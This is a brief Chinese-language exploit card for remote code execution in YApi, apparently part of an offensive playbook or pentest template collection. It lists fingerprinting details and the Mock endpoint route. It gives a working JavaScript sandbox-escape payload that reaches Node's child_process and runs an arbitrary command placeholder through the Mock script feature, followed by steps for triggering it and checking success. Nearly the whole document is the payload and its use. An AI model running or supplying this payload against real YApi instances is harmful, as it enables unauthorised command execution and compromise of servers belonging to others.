# YApi 注册与 Mock RCE (unacc)

## 指纹特征
- 服务: YApi (开启注册功能)
- 端口: 3000

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| Mock 脚本执行 | `/mock` | 无 (需注册账户) |

## PoC 指令

通过注册账户并创建接口，利用 Mock 功能执行 JS 命令：

**1. 恶意 Mock 脚本 Payload**
```javascript
const sandbox = this
const ObjectConstructor = this.constructor
const FunctionConstructor = ObjectConstructor.constructor
const myfun = FunctionConstructor('return process')
const process = myfun()
mockJson = process.mainModule.require("child_process").execSync("{{COMMAND}}").toString()
```

**2. 触发**
保存脚本并在接口预览页面访问对应 Mock URL。

## Success Signal
- **执行回显**: 在预览页面看到命令执行后的返回结果。
- **状态验证**: 命令在 Node.js 环境下成功运行。
